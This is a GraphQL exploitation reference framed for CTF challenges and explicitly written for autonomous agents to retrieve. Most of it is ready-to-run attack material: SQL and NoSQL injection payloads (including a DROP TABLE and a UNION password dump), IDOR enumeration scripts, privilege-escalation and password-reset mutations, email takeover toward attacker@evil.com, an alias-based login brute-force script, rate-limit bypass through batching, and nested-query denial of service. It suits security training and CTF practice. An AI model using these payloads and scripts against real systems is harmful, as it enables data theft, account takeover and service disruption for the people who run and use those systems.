# GraphQL Attacks - CTF Exploitation Reference

> **Document Purpose:** Actionable GraphQL attack techniques for CTF challenges. Designed for autonomous agent retrieval with introspection queries, injection techniques, and exploitation methods.

---

## 1. QUICK REFERENCE: GraphQL Basics

> **When to use this section:** You encounter a GraphQL API endpoint.

### 1.1 What is GraphQL?

**Tags:** `graphql, api, basics, query`

**Concept:**
GraphQL is a query language for APIs that allows clients to request exactly the data they need. Unlike REST, it uses a single endpoint with structured queries.

**GraphQL vs REST:**
| Feature | REST | GraphQL |
|---------|------|---------|
| Endpoints | Multiple (/users, /posts) | Single (/graphql) |
| Data fetching | Fixed responses | Client-specified |
| Request type | GET/POST to different URLs | POST with query body |
| Schema | Implicit | Explicit, queryable |

**Common GraphQL Endpoint Locations:**
```
/graphql
/graphiql
/v1/graphql
/api/graphql
/query
/gql
/playground
```

**Agent Takeaway:**
- GraphQL uses single endpoint (usually /graphql)
- Schema is queryable (introspection)
- Clients control what data is returned

---

### 1.2 GraphQL Query Structure

**Tags:** `graphql, query, mutation, syntax`

**Basic Query:**
```graphql
query {
  user(id: 1) {
    id
    username
    email
  }
}
```

**Query with Arguments:**
```graphql
query {
  users(limit: 10, role: "admin") {
    id
    username
  }
}
```

**Mutation (Modify Data):**
```graphql
mutation {
  createUser(username: "admin", password: "password123") {
    id
    username
  }
}
```

**HTTP Request Format:**
```http
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json

{"query": "query { user(id: 1) { id username email } }"}
```

**Agent Takeaway:**
- Queries read data, mutations modify data
- Arguments passed in parentheses
- Return fields specified in braces

---

## 2. GRAPHQL INTROSPECTION

> **When to use this section:** Discovering GraphQL schema and available operations.

### 2.1 Full Introspection Query

**Tags:** `graphql, introspection, schema, discovery`

**Why Introspection:**
GraphQL schemas are self-documenting. Introspection reveals all types, queries, mutations, and fields.

**Full Introspection Query:**
```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      kind
      fields {
        name
        type {
          name
          kind
          ofType {
            name
            kind
          }
        }
        args {
          name
          type {
            name
            kind
          }
        }
      }
    }
  }
}
```

**HTTP Request:**
```bash
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query{__schema{queryType{name}mutationType{name}types{name kind fields{name type{name kind ofType{name kind}}args{name type{name kind}}}}}}"}'
```

**Simple Type Listing:**
```graphql
query {
  __schema {
    types {
      name
      description
    }
  }
}
```

**Agent Takeaway:**
- Always try introspection first
- Reveals all available queries and mutations
- Shows field types and arguments

---

### 2.2 Query Available Fields

**Tags:** `graphql, introspection, fields, types`

**Get Fields for Specific Type:**
```graphql
query {
  __type(name: "User") {
    name
    fields {
      name
      type {
        name
        kind
      }
      description
    }
  }
}
```

**Get All Queries:**
```graphql
query {
  __schema {
    queryType {
      fields {
        name
        description
        args {
          name
          type { name }
        }
      }
    }
  }
}
```

**Get All Mutations:**
```graphql
query {
  __schema {
    mutationType {
      fields {
        name
        args {
          name
          type { name }
        }
      }
    }
  }
}
```

**Python Introspection Script:**
```python
import requests
import json

def introspect_graphql(url):
    query = """
    query {
      __schema {
        queryType { name }
        mutationType { name }
        types {
          name
          kind
          fields { name }
        }
      }
    }
    """

    response = requests.post(url, json={"query": query})
    data = response.json()

    print("[+] Available Types:")
    for t in data['data']['__schema']['types']:
        if not t['name'].startswith('__'):
            print(f"  - {t['name']}: {t['kind']}")
            if t.get('fields'):
                for f in t['fields']:
                    print(f"      .{f['name']}")

    return data

introspect_graphql("http://target.com/graphql")
```

**Agent Takeaway:**
- Query specific types with `__type(name: "TypeName")`
- Filter out internal types (starting with __)
- Look for sensitive types: User, Admin, Secret, Flag

---

### 2.3 When Introspection is Disabled

**Tags:** `graphql, introspection, bypass, disabled`

**Detection:**
```json
{
  "errors": [
    {"message": "GraphQL introspection is not allowed"}
  ]
}
```

**Bypass Techniques:**

**Try Different Methods:**
```http
GET /graphql?query={__schema{types{name}}}
```

**Try Field Suggestions (GraphQL will suggest valid fields):**
```graphql
query {
  users {
    nonexistentfield
  }
}
# Error may reveal: "Did you mean 'id', 'username', 'email'?"
```

**Common Query/Field Guessing:**
```graphql
# Try common query names
query { user { id } }
query { users { id } }
query { me { id } }
query { currentUser { id } }
query { admin { id } }
query { flag }
query { getFlag }
```

**Clairvoyance Tool:**
```bash
# Tool for blind GraphQL enumeration
python3 clairvoyance.py -o output.json http://target.com/graphql
```

**Agent Takeaway:**
- If introspection disabled, use error messages
- GraphQL often suggests valid field names in errors
- Try common query/mutation names

---

## 3. GRAPHQL INJECTION ATTACKS

> **When to use this section:** Exploiting input handling in GraphQL.

### 3.1 SQL Injection via GraphQL

**Tags:** `graphql, sqli, injection, database`

**The Vulnerability:**
GraphQL arguments may be passed directly to SQL queries without sanitization.

**Testing for SQLi:**
```graphql
query {
  user(id: "1' OR '1'='1") {
    id
    username
  }
}

query {
  user(id: "1; DROP TABLE users;--") {
    id
  }
}

query {
  users(name: "admin'--") {
    id
  }
}
```

**Union-Based Extraction:**
```graphql
query {
  user(id: "1' UNION SELECT username,password FROM users--") {
    id
    username
  }
}
```

**HTTP Request:**
```bash
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query{user(id:\"1\\\" OR 1=1--\"){id username}}"}'
```

**Agent Takeaway:**
- Test string arguments with SQLi payloads
- GraphQL doesn't prevent injection - backend might
- Same techniques as regular SQLi

---

### 3.2 NoSQL Injection via GraphQL

**Tags:** `graphql, nosql, mongodb, injection`

**The Vulnerability:**
GraphQL with MongoDB/NoSQL backend may be vulnerable to operator injection.

**MongoDB Operator Injection:**
```graphql
query {
  users(filter: "{\"password\": {\"$ne\": \"\"}}") {
    id
    username
    password
  }
}

query {
  user(id: "{\"$gt\": \"\"}") {
    id
    username
  }
}
```

**JSON Input Exploitation:**
```graphql
mutation {
  login(
    username: "admin"
    password: "{\"$ne\": \"\"}"
  ) {
    token
  }
}
```

**Agent Takeaway:**
- Try MongoDB operators: $ne, $gt, $regex, $where
- May work in filter/search parameters
- Test mutation arguments too

---

### 3.3 GraphQL IDOR (Insecure Direct Object Reference)

**Tags:** `graphql, idor, authorization, access-control`

**The Vulnerability:**
GraphQL may expose data without proper authorization checks.

**Testing for IDOR:**
```graphql
# Try accessing other users' data
query {
  user(id: 2) {
    id
    username
    email
    password
    secretData
  }
}

# Iterate through IDs
query {
  user(id: 1) { id email }
  user2: user(id: 2) { id email }
  user3: user(id: 3) { id email }
}
```

**Batch Query for Enumeration:**
```graphql
query {
  u1: user(id: 1) { id username email }
  u2: user(id: 2) { id username email }
  u3: user(id: 3) { id username email }
  u4: user(id: 4) { id username email }
  u5: user(id: 5) { id username email }
}
```

**Python Enumeration Script:**
```python
import requests

def enumerate_users(url, max_id=100):
    for i in range(1, max_id + 1):
        query = f'query {{ user(id: {i}) {{ id username email }} }}'
        response = requests.post(url, json={"query": query})
        data = response.json()

        if data.get('data', {}).get('user'):
            user = data['data']['user']
            print(f"[+] User {i}: {user}")

enumerate_users("http://target.com/graphql")
```

**Agent Takeaway:**
- GraphQL often lacks per-field authorization
- Try accessing other users' data by ID
- Batch queries for efficient enumeration

---

## 4. GRAPHQL AUTHORIZATION BYPASS

> **When to use this section:** Bypassing access controls in GraphQL.

### 4.1 Accessing Hidden Queries/Mutations

**Tags:** `graphql, authorization, hidden, bypass`

**Common Hidden Operations:**
```graphql
# Admin queries
query { adminUsers { id username } }
query { getAllUsers { id email password } }
query { systemConfig { apiKey secretKey } }

# Admin mutations
mutation { makeAdmin(userId: 1) { success } }
mutation { deleteUser(id: 2) { success } }
mutation { updateRole(userId: 1, role: "admin") { success } }
```

**Discovered via Introspection:**
```graphql
# Look for interesting queries/mutations in schema
query {
  __schema {
    mutationType {
      fields {
        name
        args { name type { name } }
      }
    }
  }
}
```

**Agent Takeaway:**
- Introspection reveals all operations
- Try operations that seem admin-only
- Authorization may only be on UI, not API

---

### 4.2 Field-Level Authorization Bypass

**Tags:** `graphql, field, authorization, nested`

**The Vulnerability:**
Authorization checks may only exist at query level, not field level.

**Testing Sensitive Fields:**
```graphql
# User query accessible
query {
  user(id: 1) {
    id
    username
    # Try adding sensitive fields
    password
    passwordHash
    secret
    apiKey
    token
    ssn
    creditCard
  }
}
```

**Nested Object Access:**
```graphql
query {
  posts {
    id
    title
    author {
      # Access user data through post relationship
      id
      username
      email
      password
    }
  }
}
```

**Using Aliases:**
```graphql
query {
  publicData: user(id: 1) {
    id
    username
  }
  # Try accessing same data with different context
  sensitiveData: user(id: 1) {
    password
    apiKey
  }
}
```

**Agent Takeaway:**
- Request fields not shown in UI
- Use nested relationships to access data
- Aliases can reveal inconsistent authorization

---

### 4.3 Mutation Abuse

**Tags:** `graphql, mutation, privilege-escalation, abuse`

**Self-Privilege Escalation:**
```graphql
mutation {
  updateUser(id: 1, role: "admin") {
    id
    role
  }
}

mutation {
  updateMe(isAdmin: true) {
    isAdmin
  }
}
```

**Modifying Other Users:**
```graphql
mutation {
  updateUser(id: 2, email: "attacker@evil.com") {
    id
    email
  }
}
```

**Password Reset Abuse:**
```graphql
mutation {
  resetPassword(userId: 1, newPassword: "hacked123") {
    success
  }
}

mutation {
  changePassword(userId: 1, password: "newpass") {
    success
  }
}
```

**Agent Takeaway:**
- Try mutations on your own and other users
- Look for role/privilege modification mutations
- Password reset mutations are high-value targets

---

## 5. GRAPHQL DOS AND BATCHING

> **When to use this section:** Exploiting query complexity for attacks.

### 5.1 Query Batching

**Tags:** `graphql, batching, dos, rate-limit`

**Batched Query (Array of Queries):**
```json
[
  {"query": "query { user(id: 1) { id } }"},
  {"query": "query { user(id: 2) { id } }"},
  {"query": "query { user(id: 3) { id } }"}
]
```

**Rate Limit Bypass:**
```python
import requests

# Send 100 queries in single request
queries = [
    {"query": f"query {{ user(id: {i}) {{ id email }} }}"}
    for i in range(1, 101)
]

response = requests.post(
    "http://target.com/graphql",
    json=queries
)

print(response.json())
```

**Agent Takeaway:**
- GraphQL may allow query batching
- Bypass per-request rate limits
- Efficient enumeration

---

### 5.2 Nested Query Attacks

**Tags:** `graphql, nested, dos, complexity`

**Deeply Nested Query (DoS):**
```graphql
query {
  users {
    friends {
      friends {
        friends {
          friends {
            friends {
              id
              username
            }
          }
        }
      }
    }
  }
}
```

**Circular Reference Exploitation:**
```graphql
query {
  user(id: 1) {
    posts {
      author {
        posts {
          author {
            posts {
              author {
                id
              }
            }
          }
        }
      }
    }
  }
}
```

**Agent Takeaway:**
- Nested queries can cause DoS
- Circular relationships are exploitable
- May reveal query complexity limits

---

### 5.3 Alias-Based Attacks

**Tags:** `graphql, alias, dos, enumeration`

**Using Aliases for Mass Queries:**
```graphql
query {
  a: user(id: 1) { id }
  b: user(id: 2) { id }
  c: user(id: 3) { id }
  # ... continue for many IDs
}
```

**Brute Force via Aliases:**
```graphql
query {
  try1: login(username: "admin", password: "password1") { token }
  try2: login(username: "admin", password: "password2") { token }
  try3: login(username: "admin", password: "password3") { token }
  # ... many password attempts in single request
}
```

**Python Generator:**
```python
import requests

def brute_force_login(url, username, passwords):
    # Build query with aliases
    queries = []
    for i, pwd in enumerate(passwords):
        queries.append(f'try{i}: login(username: "{username}", password: "{pwd}") {{ token }}')

    query = "mutation { " + " ".join(queries) + " }"

    response = requests.post(url, json={"query": query})
    return response.json()

passwords = ["password", "admin", "123456", "password123"]
result = brute_force_login("http://target.com/graphql", "admin", passwords)
```

**Agent Takeaway:**
- Aliases allow multiple identical queries
- Bypass rate limiting on login
- Single request = many operations

---

## 6. GRAPHQL INFORMATION DISCLOSURE

> **When to use this section:** Finding sensitive data in GraphQL.

### 6.1 Error Message Exploitation

**Tags:** `graphql, errors, information-disclosure, debugging`

**Verbose Error Messages:**
```graphql
query {
  user(id: "invalid") {
    id
  }
}
```

**May Reveal:**
```json
{
  "errors": [{
    "message": "Cannot query field 'secretField' on type 'User'. Did you mean 'secret'?",
    "locations": [{"line": 3, "column": 5}],
    "extensions": {
      "code": "GRAPHQL_VALIDATION_FAILED",
      "stacktrace": ["at /app/src/resolvers/user.js:45:12"]
    }
  }]
}
```

**Extract Field Names from Errors:**
```graphql
query {
  user(id: 1) {
    nonexistent123
  }
}
# Error: "Did you mean 'id', 'name', 'email', 'password'?"
```

**Agent Takeaway:**
- Errors may reveal field names
- Stack traces expose file paths
- Suggestion messages list valid fields

---

### 6.2 Finding Hidden Data

**Tags:** `graphql, hidden, sensitive, discovery`

**Common Sensitive Fields:**
```graphql
query {
  user(id: 1) {
    id
    username
    email
    password
    passwordHash
    token
    apiKey
    secret
    flag
    ssn
    creditCard
    internalId
    createdAt
    updatedAt
    isAdmin
    role
  }
}
```

**Debug/Internal Queries:**
```graphql
query { debug { version config } }
query { internal { flags secrets } }
query { system { env variables } }
query { flag }
query { getFlag }
query { secret }
```

**Fragment for Full Object:**
```graphql
query {
  user(id: 1) {
    ...AllFields
  }
}

fragment AllFields on User {
  id
  username
  email
  password
  role
  # Add all discovered fields
}
```

**Agent Takeaway:**
- Request all possible fields
- Look for debug/internal types
- Use fragments for complex objects

---

## 7. CTF-SPECIFIC STRATEGIES

> **When to use this section:** Solving GraphQL challenges in CTF.

### 7.1 GraphQL CTF Playbook

**Tags:** `graphql, ctf, playbook, workflow`

**Step 1: Find GraphQL Endpoint**
```
/graphql
/api/graphql
/v1/graphql
/graphiql (interactive)
/playground
```

**Step 2: Run Introspection**
```graphql
{__schema{types{name fields{name}}}}
```

**Step 3: Identify Interesting Types**
```
- User, Admin, Flag, Secret
- Query types: getFlag, adminQuery
- Mutation types: updateRole, deleteUser
```

**Step 4: Test Authorization**
```
- Access other users' data
- Try admin queries
- Modify your own role
```

**Step 5: Test for Injection**
```
- SQLi in arguments
- NoSQL operators
- Command injection
```

**Agent Takeaway:**
- Introspection first, always
- Look for flag/secret types
- Test authorization on every operation

---

### 7.2 GraphQL Decision Tree

**Tags:** `graphql, decision-tree, workflow`

```
START: GraphQL endpoint found

STEP 1: Try introspection
├── Works → Extract full schema
├── Disabled → Use error-based enumeration
└── Check for /graphiql or /playground

STEP 2: Analyze schema
├── Look for Flag, Secret, Admin types
├── Note interesting queries/mutations
├── Check for sensitive fields
└── Identify relationships between types

STEP 3: Test authorization
├── Access other user's data (IDOR)
├── Try admin-only queries
├── Attempt privilege escalation mutations
└── Request sensitive fields

STEP 4: Test for injection
├── SQLi in string arguments
├── NoSQL operators in JSON
├── Command injection in arguments
└── Check filter/search parameters

STEP 5: Advanced attacks
├── Query batching for enumeration
├── Alias-based brute force
├── Nested queries for DoS
└── Field suggestion extraction
```

---

## 8. TOOLS AND AUTOMATION

> **When to use this section:** Using tools for GraphQL testing.

### 8.1 GraphQL Tools

**Tags:** `graphql, tools, automation, testing`

**GraphQL Voyager (Visualization):**
```
Paste introspection result to visualize schema
https://apis.guru/graphql-voyager/
```

**InQL (Burp Extension):**
```
- Automated introspection
- Generate queries for all operations
- Batch testing
```

**GraphQL Cop (Security Scanner):**
```bash
python graphql-cop.py -t http://target.com/graphql
```

**Clairvoyance (Blind Enumeration):**
```bash
python clairvoyance.py -o output.json http://target.com/graphql
```

**Agent Takeaway:**
- InQL for Burp integration
- Voyager for schema visualization
- Clairvoyance when introspection disabled

---

### 8.2 Python GraphQL Client

**Tags:** `graphql, python, client, automation`

**Complete Testing Script:**
```python
import requests
import json

class GraphQLTester:
    def __init__(self, url, headers=None):
        self.url = url
        self.headers = headers or {"Content-Type": "application/json"}

    def query(self, query_string, variables=None):
        payload = {"query": query_string}
        if variables:
            payload["variables"] = variables

        response = requests.post(self.url, json=payload, headers=self.headers)
        return response.json()

    def introspect(self):
        query = """
        query {
          __schema {
            queryType { name }
            mutationType { name }
            types {
              name
              kind
              fields { name type { name } }
            }
          }
        }
        """
        return self.query(query)

    def get_type(self, type_name):
        query = f"""
        query {{
          __type(name: "{type_name}") {{
            name
            fields {{
              name
              type {{ name kind }}
            }}
          }}
        }}
        """
        return self.query(query)

    def enumerate_ids(self, query_template, id_range=range(1, 20)):
        results = []
        for i in id_range:
            result = self.query(query_template.format(id=i))
            if result.get('data'):
                results.append((i, result['data']))
        return results

# Usage
tester = GraphQLTester("http://target.com/graphql")

# Introspect
schema = tester.introspect()
print(json.dumps(schema, indent=2))

# Enumerate users
users = tester.enumerate_ids('query {{ user(id: {id}) {{ id username email }} }}')
for uid, data in users:
    print(f"User {uid}: {data}")
```

**Agent Takeaway:**
- Reusable testing class
- Automates introspection and enumeration
- Easy to extend for specific tests

---

## 9. SUMMARY: GraphQL Quick Reference

**Find Endpoint:**
```
/graphql, /api/graphql, /graphiql, /playground
```

**Introspection Query:**
```graphql
{__schema{types{name fields{name}}}}
```

**Get Type Fields:**
```graphql
{__type(name:"User"){fields{name}}}
```

**Basic Query:**
```graphql
query { user(id: 1) { id username email } }
```

**Mutation:**
```graphql
mutation { updateUser(id: 1, role: "admin") { role } }
```

**Batch Request:**
```json
[{"query":"..."}, {"query":"..."}]
```

**Alias Enumeration:**
```graphql
{ u1:user(id:1){id} u2:user(id:2){id} }
```

**SQLi Test:**
```graphql
{ user(id: "1' OR '1'='1") { id } }
```

**Key Attacks:**
```
1. Introspection - discover schema
2. IDOR - access other users' data
3. Authorization bypass - hidden queries
4. SQL/NoSQL injection - via arguments
5. Batching - bypass rate limits
```
